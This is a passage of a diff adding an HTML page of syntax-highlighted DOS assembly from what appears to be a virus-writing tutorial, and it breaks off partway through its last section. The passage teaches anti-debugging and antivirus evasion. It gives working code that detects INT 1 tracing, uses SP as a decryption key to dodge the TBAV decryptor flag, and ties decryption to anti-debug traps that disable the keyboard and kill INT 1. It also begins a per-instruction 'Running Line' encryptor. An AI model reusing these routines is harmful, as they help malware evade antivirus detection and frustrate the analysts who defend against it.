+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; int_24_off<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br/>
+&nbsp;</div>
+<p>It simply makes INT 3 point to DOS, and uses this fact to fetch the INT 24 vector.</p>
+<h3><a name="c33"></a>INT 1 Tracing Destroys the Stack</h3>
+<p>When tracing through code, with INT 1, the 6 bytes below SP are overwritten with the pushed returnig IP, CS, and Flags. There are 2 ways to take advantage of this fact. The first is to PUSH a value on to the stack, POP it, and then adjust SP and POP it again to see if it changes. If it has, the code has been traced. Here is an example:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">AX</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">POP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">AX</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">DEC</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">SP</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">DEC</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">SP</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">POP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">BX</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;BX should point to the pushed AX. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CMP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">AX</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">BX</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JNE</span> &nbsp; &nbsp; CODE_IS_TRACED<br/>
+&nbsp;</div>
+<p>The second way is to store a critigal value like a Decryption key in SP. This value should also point to the code, and you should <strong>not</strong> use any stack operations. This way, if a debugger is running, the code that SP points to will be overwritten. Here is a complete program to illustrate it. To make it run properly, you must have to encrypt it. I will not how you how.. If you can not work it out you should not even be reading this. It also has the added advantage of avoiding the TBAV '#' (decryptor) flag. Any way here it is:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;STACK.ASM</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; radix &nbsp; <span style="color: #ff0000;">16</span><br/>
+<br/>
+elength <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: black;">&#40;</span>end <span style="color: #339933;">-</span> estart<span style="color: black;">&#41;</span><span style="color: #339933;">/</span><span style="color: #ff0000;">2</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">sp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cli</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span>estart<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sti</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">sp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>elength<br/>
+<br/>
+eloop<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">sp</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;SP is decryption key.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;If a Debugger is running, </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cli</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;All the code after ESTART will be </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;overwritten.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sti</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; eloop<br/>
+<br/>
+estart<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cli</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sti</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset msg <span style="color: #339933;">-</span> <span style="color: #ff0000;">12</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">12</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>4c<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+<br/>
+msg &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Yeah!!$'</span><br/>
+end<span style="color: #339933;">:</span><br/>
+&nbsp;</div>
+<h3><a name="c34"></a>Use Your Anti-Debug Routines as The Decrypt Key</h3>
+<p>This is a lot easier to do then it sounds. Basically, all you have to do is retreive a byte from the Anti - Debugger routines each time, and use it to modify your decryption routine in some manor. Of course the code you are decrypting must have been encrypted in a corresponding manner! Any way, here is a code fragment example:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;This code LODSBs a byte from the Anti-Debug routine, on each iteration, </span><br/>
+<span style="color: black; font-style: italic;">;and ADDs it to the XOR key. Because of this the AV can not simply NOP </span><br/>
+<span style="color: black; font-style: italic;">;out the INT 3, and other traps in the Anti-Debug routine which is called </span><br/>
+<span style="color: black; font-style: italic;">;on each iteration! DEC_START is assumed to be the offset of the start of </span><br/>
+<span style="color: black; font-style: italic;">;the encrypted code, while DEC_LENGTH is the number of bytes to decrypt. </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span>0aa&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;initial key.</span><br/>
+<br/>
+decrypt<span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset dec_start<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>dec_length<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset decrypt &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;offset of code to use </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;to modify decryption key.</span><br/>
+dec_loop<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;AL=byte from anti-debug </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;routines</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;MODIFY KEY. If code has been </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;modified, the key will be </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;wrong.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dl</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;decrypt</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; anti_debug&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;kill debuggers. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;this call cant be NOP'd out, </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;as it is part of the Decrypt </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;key.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset end_ad&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;if SI has reached end of </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; no_fix&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;anti-debug code, reset it. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset decrypt<br/>
+no_fix<span style="color: #339933;">:</span> <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; dec_loop<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; dec_start &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;JMP past Anti_Debug to </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;the newly decrypted code.. </span><br/>
+<br/>
+Anti_Debug<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get IRQ status.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Disable IRQ 1 (keyboard)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">out</span> &nbsp; &nbsp; <span style="color: #ff0000;">20</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;stop the debugger on each loop (you cant </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;NOP these out!), note that when the debugger </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;stops here, the keyboard will be disabled, </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;so the can't do any thing! </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Kill INT 1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Fuck with their heads</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;restore INT 1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset ad_jmp&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;destination of JMP </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;if this code was traced, AX will no longer </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;be equal to the JMP destination </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; (BELOW CODE IS ENCRYPTED)</span><br/>
+<br/>
+dec_start<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #00007f; font-weight: bold;">NOT</span> <span style="color: #ff0000;">2</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">out</span> &nbsp; &nbsp; <span style="color: #ff0000;">20</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Re-Enable Key board..</span><br/>
+&nbsp;</div>
+<h3><a name="c35"></a>The Running Line</h3>
+<p>The last method, I am going to illustrate, is called the Running Line. It is VERY resistant to debuggers. It involves hooking INT 1, and Decrypting each instruction <em>just before</em> it's run, and Re-Encrypting it <em>straigh after</em> it has been executed. This way, only <em>1</em> instruction at a time is decrypted in memory. Here is a fully working example.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;RUNLINE.ASM</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; radix &nbsp; <span style="color: #ff0000;">16</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ax=0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;es=ax=0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #ff0000;">6</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save int 1 vector </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>offset tracer<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span>W<span style="color: black;">&#91;</span><span style="color: #ff0000;">6</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;int1 = cs:tracer</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">sp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; B<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set TRACE flag</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set it</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;this serves no purpose, and </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;is just here because the first </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;instruction after setting the </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;flag is not traced.</span><br/>
+<span style="color: black; font-style: italic;">;**********************************************************************</span><br/>
+<span style="color: black; font-style: italic;">;** The below data, is the Encrypted instructions. The INT 1 handler ** </span><br/>
+<span style="color: black; font-style: italic;">;** only decrypts instruction on WORD (EVEN) boundaries. It XORs the ** </span><br/>
+<span style="color: black; font-style: italic;">;** instruction (WORD) with its offset in CS (ie. it's IP when it's &nbsp;**</span><br/>
